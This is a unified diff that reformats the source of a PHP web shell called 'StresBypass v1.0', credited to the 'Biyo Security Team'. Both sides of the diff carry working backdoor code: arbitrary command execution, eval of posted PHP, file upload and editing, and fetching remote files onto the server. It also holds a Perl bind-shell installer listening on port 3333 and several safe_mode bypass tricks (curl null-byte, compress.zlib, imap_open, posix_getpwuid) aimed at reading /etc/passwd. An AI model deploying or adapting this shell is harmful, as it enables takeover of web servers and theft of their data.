@@ -3,7 +3,7 @@
 error_reporting(5);
 @ignore_user_abort(true);
 @set_magic_quotes_runtime(0);
-$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
+$win = 'win' == strtolower(substr(PHP_OS, 0, 3));
 /**********************************************************/
 /*                          StresBypass v1.0
 /*                       --------- ----------
@@ -70,66 +70,66 @@ StresBypass shell</title>
 <p align="center">
     <b>
     <?php
-    $dirfile="$file_to_download";
+    $dirfile = "$file_to_download";
 if (file_exists("$dirfile")) {
     header("location: $dirfile");
 }
-if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
+if (@ini_get('safe_mode') or 'on' == strtolower(@ini_get('safe_mode'))) {
     $safemode = true;
-    $hsafemode = "<font color=\"red\">ON (secure)</font>";
+    $hsafemode = '<font color="red">ON (secure)</font>';
 } else {
     $safemode = false;
-    $hsafemode = "<font color=\"green\">Kapalý ( GüvenLik Kapalý )</font>";
+    $hsafemode = '<font color="green">Kapalý ( GüvenLik Kapalý )</font>';
 }
-echo("Mod: $hsafemode");
+echo "Mod: $hsafemode";
 // PHPINFO
-if ($_GET['action'] == "phpinfo") {
-    echo $phpinfo=(!eregi("phpinfo", $dis_func)) ? phpinfo() : "phpinfo() b? c?m";
+if ('phpinfo' == $_GET['action']) {
+    echo $phpinfo = (!eregi('phpinfo', $dis_func)) ? phpinfo() : 'phpinfo() b? c?m';
     exit;
 }
-$v = @ini_get("open_basedir");
-if ($v or strtolower($v) == "on") {
+$v = @ini_get('open_basedir');
+if ($v or 'on' == strtolower($v)) {
     $openbasedir = true;
-    $hopenbasedir = "<font color=\"red\">".$v."</font>";
+    $hopenbasedir = '<font color="red">' . $v . '</font>';
 } else {
     $openbasedir = false;
-    $hopenbasedir = "<font color=\"green\">Kapalý ( GüvenLik Kapalý )</font>";
+    $hopenbasedir = '<font color="green">Kapalý ( GüvenLik Kapalý )</font>';
 }
-echo("<br>");
-echo("Open base dir: $hopenbasedir");
-echo("<br>");
-echo "PostgreSQL: <b>";
+echo '<br>';
+echo "Open base dir: $hopenbasedir";
+echo '<br>';
+echo 'PostgreSQL: <b>';
 $pg_on = @function_exists('pg_connect');
 if ($pg_on) {
-    echo "<font color=green>Açýk</font></b>";
+    echo '<font color=green>Açýk</font></b>';
 } else {
-    echo "<font color=red>Kapalý</font></b>";
+    echo '<font color=red>Kapalý</font></b>';
 }
-echo("<br>");
-echo "MSSQL: <b>";
+echo '<br>';
+echo 'MSSQL: <b>';
 $mssql_on = @function_exists('mssql_connect');
 if ($mssql_on) {
-    echo "<font color=green>Açýk</font></b>";
+    echo '<font color=green>Açýk</font></b>';
 } else {
-    echo "<font color=red>Kapalý</font></b>";
+    echo '<font color=red>Kapalý</font></b>';
 }
-echo("<br>");
-echo "MySQL: <b>";
+echo '<br>';
+echo 'MySQL: <b>';
 $mysql_on = @function_exists('mysql_connect');
 if ($mysql_on) {
-    echo "<font color=green>Açýk</font></b>";
+    echo '<font color=green>Açýk</font></b>';
 } else {
-    echo "<font color=red>Kapalý</font></b>";
+    echo '<font color=red>Kapalý</font></b>';
 }
-echo("<br>");
-echo "PHP version: <b>".@phpversion()."</b>";
-echo("<br>");
-echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
+echo '<br>';
+echo 'PHP version: <b>' . @phpversion() . '</b>';
+echo '<br>';
+echo 'cURL: ' . (($curl_on) ? ('<b><font color=green>ON</font></b>') : ('<b><font color=red>OFF</font></b>'));
 
-echo("<br>");
-echo "Disable functions : <b>";
-if (''==($df=@ini_get('disable_functions'))) {
-    echo "<font color=green>Hiç</font></b>";
+echo '<br>';
+echo 'Disable functions : <b>';
+if ('' == ($df = @ini_get('disable_functions'))) {
+    echo '<font color=green>Hiç</font></b>';
 } else {
     echo "<font color=red>$df</font></b>";
 }
@@ -141,8 +141,8 @@ $all = @disk_total_space($dir);
 if (!$all) {
     $all = 0;
 }
-$used = $all-$free;
-$used_percent = @round(100/($all/$free), 2);
+$used = $all - $free;
+$used_percent = @round(100 / ($all / $free), 2);
 
 ?>
 </b></p>
@@ -165,7 +165,7 @@ $used_percent = @round(100/($all/$free), 2);
 <font size="4px">
 <b>
         <font size="1" face="Verdana" color="#DCE7EF">OS:</font><font color="#DCE7EF" size="-2" face="verdana"><font size="1" face="Arial"> <?php echo php_uname(); ?> </font></span></font></b><p>
-<font size="1" face="Verdana" color="#DCE7EF">Server:</font><font color="#DCE7EF" size="1" face="Arial"> </font><font color="#DCE7EF" size="1" face="Arial"><?php echo(htmlentities($_SERVER['SERVER_SOFTWARE'])); ?> </font></font>
+<font size="1" face="Verdana" color="#DCE7EF">Server:</font><font color="#DCE7EF" size="1" face="Arial"> </font><font color="#DCE7EF" size="1" face="Arial"><?php echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?> </font></font>
 </font>
 </p>
 </font>
@@ -176,10 +176,10 @@ $used_percent = @round(100/($all/$free), 2);
     </font>
     <a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none">
 <font size=-2 face=verdana color="#FFFFFF">
-<?php passthru("id");?></font><font size=-2 face=verdana color="black"><br>
+<?php passthru('id'); ?></font><font size=-2 face=verdana color="black"><br>
     </font>
 </a><span lang="en-us"><font face="Wingdings" size="3" color="#FFFFFF">1</font></span><a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none"><font size="-2" face="verdana"><font size=-2 face=Verdana color="#DCE7EF">:</font><font size=-2 face=verdana color="#DCE7EF">
-<?php echo getcwd();?></div></font></font></a></font></b></a></font><br>
+<?php echo getcwd(); ?></div></font></font></a></font></b></a></font><br>
 
 <br> <b><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font size="4px"><font color="#FF0000" face="Verdana" size="-2">
 </font></font><font color="#FF0000" face="Verdana" size="2">
@@ -272,23 +272,23 @@ port
     </b>
 </font></p></td></tr></table>
 <?php
-if ($act == "help") {
-    echo "<center><b>?????? ????? ????? ???? ???????<br><br>????? ????????<br>??? ???? ???????? ???? ??? ??? ?????? ?????? ?????? ??????<br>?????? ?? ??????? ??????   </a>.</b>";
+if ('help' == $act) {
+    echo '<center><b>?????? ????? ????? ???? ???????<br><br>????? ????????<br>??? ???? ???????? ???? ??? ??? ?????? ?????? ?????? ??????<br>?????? ?? ??????? ??????   </a>.</b>';
 }
-if ($act == "bindport") {
+if ('bindport' == $act) {
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
-<b>/bin/bash</b><input type=\"text\" name=\"installpath\" value=\"" . getcwd() . "\">
-<b>Port</b><input type=\"text\" name=\"port\" value=\"3333\">
-<INPUT type=\"hidden\" name=\"installbind\" value=\"yes\">
-<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
-<INPUT type=\"submit\" value=\"Connect\"></form></div>";
+<b>/bin/bash</b><input type=\"text\" name=\"installpath\" value=\"" . getcwd() . '">
+<b>Port</b><input type="text" name="port" value="3333">
+<INPUT type="hidden" name="installbind" value="yes">
+<INPUT type="hidden" name="dir" value="' . getcwd() . '">
+<INPUT type="submit" value="Connect"></form></div>';
 }
-if ($act == "tools") {
+if ('tools' == $act) {
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
 Dosya Düzenle:
 <input type=\"text\" name=\"editfile\" >
-<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
-<INPUT type=\"submit\" value=\"Edit\"></form></div>";
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . '">
+<INPUT type="submit" value="Edit"></form></div>';
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
 <table id=tb><tr><td>
 <INPUT type=\"hidden\" name=\"php\" value=\"yes\">
@@ -298,70 +298,70 @@ Dosya Düzenle:
 <INPUT type=\"text\" name=\"filefrom\" size=30 value=\"http://\">
 <b>-->>:</b>
 <INPUT type=\"text\" name=\"fileto\" size=30>
-<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\"></td><td>
-<INPUT type=\"submit\" value=\"Download\" id=input></td></tr></table></form></div>";
+<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . '"></td><td>
+<INPUT type="submit" value="Download" id=input></td></tr></table></form></div>';
 }
-if ($act == "about") {
-    echo "<center><b>Coding by:<br><br>By Stres<br>&<br><br>-----<br><br>Biyo Security Team<br><br>Bypass Version:1.0 Beta phpshell code<br>Turkiye</a>.</b>";
-}
-
-if ($act == "bind") {
-    echo "<center><b>By Stres:<br><br>-Connect ?? ?????? ??? ????.<br>.- ??? ????? ????? ???????? ???????<br>.-???? ????? ???? ??? ????? ???<br>nc -lp 3333?????? ?????? - <br>???????? ???? ?????? <br>Bind port to  :<br> bind shell ?????? ? ??   </a>.</b>";
+if ('about' == $act) {
+    echo '<center><b>Coding by:<br><br>By Stres<br>&<br><br>-----<br><br>Biyo Security Team<br><br>Bypass Version:1.0 Beta phpshell code<br>Turkiye</a>.</b>';
 }
 
-if ($act == "command") {
-    echo "<center><b>By Stres:<br><br>??????? ??????? ???????  Select ------ x  ???? ??? ??????<br>.- ???? ???? ?????  ??????? ????? ?? ????? ???????<br>Command   </a>.</b>";
+if ('bind' == $act) {
+    echo '<center><b>By Stres:<br><br>-Connect ?? ?????? ??? ????.<br>.- ??? ????? ????? ???????? ???????<br>.-???? ????? ???? ??? ????? ???<br>nc -lp 3333?????? ?????? - <br>???????? ???? ?????? <br>Bind port to  :<br> bind shell ?????? ? ??   </a>.</b>';
 }
 
-if ($act == "team") {
-    echo "<center><b>By Stres<br><br>BiyoSecurityTeam<br><br> </a>.</b>";
+if ('command' == $act) {
+    echo '<center><b>By Stres:<br><br>??????? ??????? ???????  Select ------ x  ???? ??? ??????<br>.- ???? ???? ?????  ??????? ????? ?? ????? ???????<br>Command   </a>.</b>';
+}
+
+if ('team' == $act) {
+    echo '<center><b>By Stres<br><br>BiyoSecurityTeam<br><br> </a>.</b>';
 }
 if (array_key_exists('image', $_GET)) {
     header('Content-Type: image/gif');
     die(getimage($_GET['image']));
 }
 
-if ($act == "bypass") {
+if ('bypass' == $act) {
     echo "
 <form action=\"$REQUEST_URI\" method=\"POST\">
 <table id=tb><tr><td>Uygula:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\"></td></tr></table>
 ";
-    echo("<FONT COLOR=\"RED\"> bypass safemode with copy </FONT>");
+    echo '<FONT COLOR="RED"> bypass safemode with copy </FONT>';
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>read file :
 <INPUT type=\"text\" name=\"copy\" size=30 value=\"/etc/passwd\">
 <INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
-    echo("<FONT COLOR=\"RED\"> bypass safemode with CuRl</FONT>");
+    echo '<FONT COLOR="RED"> bypass safemode with CuRl</FONT>';
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>read file :
 <INPUT type=\"text\" name=\"curl\" size=30 value=\"/etc/passwd\">
 <INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
-    echo("<FONT COLOR=\"RED\"> bypass safemode with imap()</FONT>");
+    echo '<FONT COLOR="RED"> bypass safemode with imap()</FONT>';
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td><select name=switch><option value=file>View file</option><option value=dir>View dir</option></select>
 <INPUT type=\"text\" name=\"string\" size=30 value=\"/etc/passwd\">
 <INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
-    echo("<FONT COLOR=\"RED\"> bypass safemode with id()</FONT>");
+    echo '<FONT COLOR="RED"> bypass safemode with id()</FONT>';
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>
 <select name=plugin><option>cat /etc/passwd</option></select>
 <INPUT type=\"submit\" value=\"Show\" id=input></td></tr></table></form></div>";
-    echo("<FONT COLOR=\"RED\"> Exploit: error_log()</FONT>");
+    echo '<FONT COLOR="RED"> Exploit: error_log()</FONT>';
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>
 <INPUT type=\"text\" name=\"ERORR\" size=30 value=\"\">
 <INPUT type=\"submit\" value=\"Write\" id=input></td></tr></table></form></div>";
 }
-if ($act == "decoder") {
-    echo("<FONT COLOR=\"RED\"> replace Chr()</FONT>");
+if ('decoder' == $act) {
+    echo '<FONT COLOR="RED"> replace Chr()</FONT>';
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td>
 <textarea name=\"Mohajer22\" cols=\"50\" rows=\"15\" wrar=\"off\">
 </textarea><br>
 <INPUT type=\"submit\" value=\"Replace\" id=input></td></tr></table></form></div>";
 }
-if ($act == "SQL") {
-    echo("<FONT COLOR=\"RED\">   MySQL    </FONT>");
+if ('SQL' == $act) {
+    echo '<FONT COLOR="RED">   MySQL    </FONT>';
     echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <table id=tb><tr><td> Username :
 <INPUT type=\"text\" name=\"username\" size=30 value=\"\">\n
@@ -389,19 +389,19 @@ password :
 // chr() //
 if (empty($_POST['Mohajer22'])) {
 } else {
-    $m=$_POST['Mohajer22'];
-    $m=str_replace(" ", "", $m);
-    $m=str_replace("(", "", $m);
-    $m=str_replace(")", "", $m);
-    $m=str_replace(".", ";", $m);
-    $m=str_replace("chr", "&#", $m);
-    $m=str_replace(" ", "", $m);
-    echo $m ;
+    $m = $_POST['Mohajer22'];
+    $m = str_replace(' ', '', $m);
+    $m = str_replace('(', '', $m);
+    $m = str_replace(')', '', $m);
+    $m = str_replace('.', ';', $m);
+    $m = str_replace('chr', '&#', $m);
+    $m = str_replace(' ', '', $m);
+    echo $m;
 }
 // ERORR //
 if (empty($_POST['ERORR'])) {
 } else {
-    $ERORR=$_POST['ERORR'];
+    $ERORR = $_POST['ERORR'];
     echo  error_log("
 <html>
 <head>
@@ -458,20 +458,18 @@ print include(\$h) ;
 // id //
 if ($_POST['plugin']) {
     switch ($_POST['plugin']) {
-                                 case("cat /etc/passwd"):
-                                           for ($uid=0;$uid<6000;$uid++) {   //cat /etc/passwd
+                                 case 'cat /etc/passwd':
+                                           for ($uid = 0; $uid < 6000; ++$uid) {   //cat /etc/passwd
                                                $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                    while (list($key, $val) = each($ara)) {
-                                                       print "$val:";
+                                                       echo "$val:";
                                                    }
-                                                   print "<br>";
+                                                   echo '<br>';
                                                }
                                            }
 
                                 break;
-
-
                                                 }
 }
 
@@ -479,59 +477,59 @@ if ($_POST['plugin']) {
 $string = !empty($_POST['string']) ? $_POST['string'] : 0;
 $switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;
 
-if ($string && $switch == "file") {
-    $stream = imap_open($string, "", "");
+if ($string && 'file' == $switch) {
+    $stream = imap_open($string, '', '');
 
     $str = imap_body($stream, 1);
     if (!empty($str)) {
-        echo "<pre>".$str."</pre>";
+        echo '<pre>' . $str . '</pre>';
     }
     imap_close($stream);
-} elseif ($string && $switch == "dir") {
-    $stream = imap_open("/etc/passwd", "", "");
-    if ($stream == false) {
+} elseif ($string && 'dir' == $switch) {
+    $stream = imap_open('/etc/passwd', '', '');
+    if (false == $stream) {
         die("Can't open imap stream");
     }
 
-    $string = explode("|", $string);
+    $string = explode('|', $string);
     if (count($string) > 1) {
         $dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
     } else {
-        $dir_list = imap_list($stream, trim($string[0]), "*");
+        $dir_list = imap_list($stream, trim($string[0]), '*');
     }
-    echo "<pre>";
-    for ($i = 0; $i < count($dir_list); $i++) {
-        echo "$dir_list[$i]"."<p> </p>" ;
+    echo '<pre>';
+    for ($i = 0; $i < count($dir_list); ++$i) {
+        echo "$dir_list[$i]" . '<p> </p>';
     }
-    echo "</pre>";
+    echo '</pre>';
     imap_close($stream);
 }
 // CURL //
 if (empty($_POST['curl'])) {
 } else {
-    $m=$_POST['curl'];
+    $m = $_POST['curl'];
     $ch =
-curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
+curl_init('file:///' . $m . "\x00/../../../../../../../../../../../../" . __FILE__);
     curl_exec($ch);
     var_dump(curl_exec($ch));
 }
 
 // copy//
-$u1p="";
-$tymczas="";
+$u1p = '';
+$tymczas = '';
 if (empty($_POST['copy'])) {
 } else {
-    $u1p=$_POST['copy'];
-    $temp=tempnam($tymczas, "cx");
-    if (copy("compress.zlib://".$u1p, $temp)) {
-        $zrodlo = fopen($temp, "r");
+    $u1p = $_POST['copy'];
+    $temp = tempnam($tymczas, 'cx');
+    if (copy('compress.zlib://' . $u1p, $temp)) {
+        $zrodlo = fopen($temp, 'r');
         $tekst = fread($zrodlo, filesize($temp));
         fclose($zrodlo);
-        echo "".htmlspecialchars($tekst)."";
+        echo '' . htmlspecialchars($tekst) . '';
         unlink($temp);
     } else {
-        die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
-<B>".htmlspecialchars($u1p)."</B> dosen't exists or you don't have
+        die('<FONT COLOR="RED"><CENTER>Sorry... File
+<B>' . htmlspecialchars($u1p) . "</B> dosen't exists or you don't have
 access.</CENTER></FONT>");
     }
 }
@@ -544,9 +542,6 @@ $cmd = stripslashes($cmd);
 $REQUEST_URI = $_SERVER['REQUEST_URI'];
 $dires = '';
 $files = '';
-
-
-
 
 if (isset($_POST['port'])) {
     $bind = "
@@ -583,8 +578,6 @@ function decode($buffer)
     return  convert_cyr_string($buffer, 'd', 'w');
 }
 
-
-
 function execute($com)
 {
     if (!empty($com)) {
@@ -602,146 +595,133 @@ function execute($com)
     }
 }
 
-
 function perms($mode)
 {
     if ($mode & 0x1000) {
-        $type='p';
+        $type = 'p';
     } elseif ($mode & 0x2000) {
-        $type='c';
+        $type = 'c';
     } elseif ($mode & 0x4000) {
-        $type='d';
+        $type = 'd';
     } elseif ($mode & 0x6000) {
-        $type='b';
+        $type = 'b';
     } elseif ($mode & 0x8000) {
-        $type='-';
+        $type = '-';
     } elseif ($mode & 0xA000) {
-        $type='l';
+        $type = 'l';
     } elseif ($mode & 0xC000) {
-        $type='s';
+        $type = 's';
     } else {
-        $type='u';
+        $type = 'u';
     }
-    $owner["read"] = ($mode & 00400) ? 'r' : '-';
-    $owner["write"] = ($mode & 00200) ? 'w' : '-';
-    $owner["execute"] = ($mode & 00100) ? 'x' : '-';
-    $group["read"] = ($mode & 00040) ? 'r' : '-';
-    $group["write"] = ($mode & 00020) ? 'w' : '-';
-    $group["execute"] = ($mode & 00010) ? 'x' : '-';
-    $world["read"] = ($mode & 00004) ? 'r' : '-';
-    $world["write"] = ($mode & 00002) ? 'w' : '-';
-    $world["execute"] = ($mode & 00001) ? 'x' : '-';
+    $owner['read'] = ($mode & 00400) ? 'r' : '-';
+    $owner['write'] = ($mode & 00200) ? 'w' : '-';
+    $owner['execute'] = ($mode & 00100) ? 'x' : '-';
+    $group['read'] = ($mode & 00040) ? 'r' : '-';
+    $group['write'] = ($mode & 00020) ? 'w' : '-';
+    $group['execute'] = ($mode & 00010) ? 'x' : '-';
+    $world['read'] = ($mode & 00004) ? 'r' : '-';
+    $world['write'] = ($mode & 00002) ? 'w' : '-';
+    $world['execute'] = ($mode & 00001) ? 'x' : '-';
     if ($mode & 0x800) {
-        $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
+        $owner['execute'] = ('x' == $owner['execute']) ? 's' : 'S';
     }
     if ($mode & 0x400) {
-        $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
+        $group['execute'] = ('x' == $group['execute']) ? 's' : 'S';
     }
     if ($mode & 0x200) {
-        $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
+        $world['execute'] = ('x' == $world['execute']) ? 't' : 'T';
     }
-    $s=sprintf("%1s", $type);
-    $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
-    $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
-    $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
+    $s = sprintf('%1s', $type);
+    $s .= sprintf('%1s%1s%1s', $owner['read'], $owner['write'], $owner['execute']);
+    $s .= sprintf('%1s%1s%1s', $group['read'], $group['write'], $group['execute']);
+    $s .= sprintf('%1s%1s%1s', $world['read'], $world['write'], $world['execute']);
+
     return trim($s);
 }
 
-
-
-
-
-
-if (isset($_POST['post']) and $_POST['post'] == "yes" and @$HTTP_POST_FILES["userfile"][name] !== "") {
-    copy($HTTP_POST_FILES["userfile"]["tmp_name"], $HTTP_POST_FILES["userfile"]["name"]);
+if (isset($_POST['post']) and 'yes' == $_POST['post'] and '' !== @$HTTP_POST_FILES['userfile'][name]) {
+    copy($HTTP_POST_FILES['userfile']['tmp_name'], $HTTP_POST_FILES['userfile']['name']);
 }
 
-if ((isset($_POST['fileto']))||(isset($_POST['filefrom']))) {
-    $data = implode("", file($_POST['filefrom']));
-    $fp = fopen($_POST['fileto'], "wb");
+if ((isset($_POST['fileto'])) || (isset($_POST['filefrom']))) {
+    $data = implode('', file($_POST['filefrom']));
+    $fp = fopen($_POST['fileto'], 'wb');
     fputs($fp, $data);
     $ok = fclose($fp);
     if ($ok) {
-        $size = filesize($_POST['fileto'])/1024;
-        $sizef = sprintf("%.2f", $size);
-        print "<center><div id=logostrip>Download - OK. (".$sizef."??)</div></center>";
+        $size = filesize($_POST['fileto']) / 1024;
+        $sizef = sprintf('%.2f', $size);
+        echo '<center><div id=logostrip>Download - OK. (' . $sizef . '??)</div></center>';
     } else {
-        print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
+        echo '<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>';
     }
 }
 
 if (isset($_POST['installbind'])) {
-    if (is_dir($_POST['installpath']) == true) {
+    if (true == is_dir($_POST['installpath'])) {
         chdir($_POST['installpath']);
-        $_POST['installpath'] = "temp.pl";
+        $_POST['installpath'] = 'temp.pl';
     }
 
-
-    $fp = fopen($_POST['installpath'], "w");
+    $fp = fopen($_POST['installpath'], 'w');
     fwrite($fp, $bind);
     fclose($fp);
 
-    exec("perl " . $_POST['installpath']);
+    exec('perl ' . $_POST['installpath']);
     chdir($dir);
 }
 
-
 @$ef = stripslashes($_POST['editfile']);
 if ($ef) {
-    $fp = fopen($ef, "r");
+    $fp = fopen($ef, 'r');
     $filearr = file($ef);
-
-
 
     $string = '';
     $content = '';
     foreach ($filearr as $string) {
-        $string = str_replace("<", "<", $string);
-        $string = str_replace(">", ">", $string);
+        $string = str_replace('<', '<', $string);
+        $string = str_replace('>', '>', $string);
         $content = $content . $string;
     }
 
     echo "<center><div id=logostrip>Edit file: $ef </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=100 rows=20>$content</textarea>
-<input type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
+<input type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
 <input type=\"hidden\" name=\"savefile\" value=\"{$_POST['editfile']}\"><br>
 <input type=\"submit\" name=\"submit\" value=\"Save\" id=input></form></center>";
     fclose($fp);
 }
 
 if (isset($_POST['savefile'])) {
-    $fp = fopen($_POST['savefile'], "w");
+    $fp = fopen($_POST['savefile'], 'w');
     $content = stripslashes($content);
     fwrite($fp, $content);
     fclose($fp);
-    echo "<center><div id=logostrip>saved -OK!</div></center>";
+    echo '<center><div id=logostrip>saved -OK!</div></center>';
 }
-
 
 if (isset($_POST['php'])) {
     echo "<center><div id=logostrip>eval code<br><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>
 <input type=\"submit\" name=\"submit\" value=\"Exec\" id=input></form></center></div>";
 }
 
-
-
 if (isset($_POST['phpcode'])) {
-    echo "<center><div id=logostrip>Results of PHP execution<br><br>";
+    echo '<center><div id=logostrip>Results of PHP execution<br><br>';
     @eval(stripslashes($_POST['phpcode']));
-    echo "</div></center>";
+    echo '</div></center>';
 }
 
-
 if ($cmd) {
-    if ($sertype == "winda") {
+    if ('winda' == $sertype) {
         ob_start();
         execute($cmd);
-        $buffer = "";
+        $buffer = '';
         $buffer = ob_get_contents();
         ob_end_clean();
     } else {
         ob_start();
         echo decode(execute($cmd));
-        $buffer = "";
+        $buffer = '';
         $buffer = ob_get_contents();
         ob_end_clean();
     }
@@ -749,50 +729,50 @@ if ($cmd) {
     if (trim($buffer)) {
         echo "<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>";
         echo decode($buffer);
-        echo "</textarea></center></div>";
+        echo '</textarea></center></div>';
     }
 }
-$arr = array();
+$arr = [];
 
-$arr = array_merge($arr, glob("*"));
-$arr = array_merge($arr, glob(".*"));
-$arr = array_merge($arr, glob("*.*"));
+$arr = array_merge($arr, glob('*'));
+$arr = array_merge($arr, glob('.*'));
+$arr = array_merge($arr, glob('*.*'));
 $arr = array_unique($arr);
 sort($arr);
-echo "<table><tr><td>Name</td><td><a title=\"Type of object\">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title=\"If Yes, you have write permission\">Write</a></td><td><a title=\"If Yes, you have read permission\">Read</a></td></tr>";
+echo '<table><tr><td>Name</td><td><a title="Type of object">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title="If Yes, you have write permission">Write</a></td><td><a title="If Yes, you have read permission">Read</a></td></tr>';
 
 foreach ($arr as $filename) {
-    if ($filename != "." and $filename != "..") {
-        if (is_dir($filename) == true) {
-            $directory = "";
-            $directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y", fileatime($filename)) . "</td><td>" . date("G:i j M Y", filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
-            if (is_writable($filename) == true) {
-                $directory = $directory . "<td>Yes</td>";
+    if ('.' != $filename and '..' != $filename) {
+        if (true == is_dir($filename)) {
+            $directory = '';
+            $directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . '</td><td></td><td>' . date('G:i j M Y', fileatime($filename)) . '</td><td>' . date('G:i j M Y', filemtime($filename)) . '</td><td>' . perms(fileperms($filename));
+            if (true == is_writable($filename)) {
+                $directory = $directory . '<td>Yes</td>';
             } else {
-                $directory = $directory . "<td>No</td>";
+                $directory = $directory . '<td>No</td>';
             }
 
-            if (is_readable($filename) == true) {
-                $directory = $directory . "<td>Yes</td>";
+            if (true == is_readable($filename)) {
+                $directory = $directory . '<td>Yes</td>';
             } else {
-                $directory = $directory . "<td>No</td>";
+                $directory = $directory . '<td>No</td>';
             }
             $dires = $dires . $directory;
         }
 
-        if (is_file($filename) == true) {
-            $file = "";
-            $file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y", fileatime($filename)) . "</td><td>" . date("G:i j M Y", filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
-            if (is_writable($filename) == true) {
-                $file = $file . "<td>Yes</td>";
+        if (true == is_file($filename)) {
+            $file = '';
+            $file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . '</td><td>' . filesize($filename) . '</td><td>' . date('G:i j M Y', fileatime($filename)) . '</td><td>' . date('G:i j M Y', filemtime($filename)) . '</td><td>' . perms(fileperms($filename));
+            if (true == is_writable($filename)) {
+                $file = $file . '<td>Yes</td>';
             } else {
-                $file = $file . "<td>No</td>";
+                $file = $file . '<td>No</td>';
             }
 
-            if (is_readable($filename) == true) {
-                $file = $file . "<td>Yes</td></td></tr>";
+            if (true == is_readable($filename)) {
+                $file = $file . '<td>Yes</td></td></tr>';
             } else {
-                $file = $file . "<td>No</td></td></tr>";
+                $file = $file . '<td>No</td></td></tr>';
             }
             $files = $files . $file;
         }
@@ -800,10 +780,7 @@ foreach ($arr as $filename) {
 }
 echo $dires;
 echo $files;
-echo "</table><br>";
-
-
-
+echo '</table><br>';
 
 echo "
 <form action=\"$REQUEST_URI\" method=\"POST\">
@@ -813,21 +790,14 @@ Emred:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">
 Rehber:<INPUT type=\"text\" name=\"dir\" size=30 value=\"";
 
 echo getcwd();
-echo "\">
-<INPUT type=\"submit\" value=\"..Exec..\"></form>";
+echo '">
+<INPUT type="submit" value="..Exec.."></form>';
 
-
-
-
-
-if (ini_get('safe_mode') == 1) {
-    echo "<br><font size=\"3\"color=\"#cc0000\"><b>SAFE MOD IS ON<br>
-Including from here: "
-. ini_get('safe_mode_include_dir') . "<br>Exec here: " . ini_get('safe_mode_exec_dir'). "</b></font>";
+if (1 == ini_get('safe_mode')) {
+    echo '<br><font size="3"color="#cc0000"><b>SAFE MOD IS ON<br>
+Including from here: '
+. ini_get('safe_mode_include_dir') . '<br>Exec here: ' . ini_get('safe_mode_exec_dir') . '</b></font>';
 }
-
-
-
 
 ?> </td></tr></table></p></td></tr></table></a><br><hr size="1" noshade><b></form></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
 <tr><td width="100%" height="1" valign="top" colspan="2" bgcolor="#000000"><p align="center">
@@ -891,8 +861,8 @@ Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">";
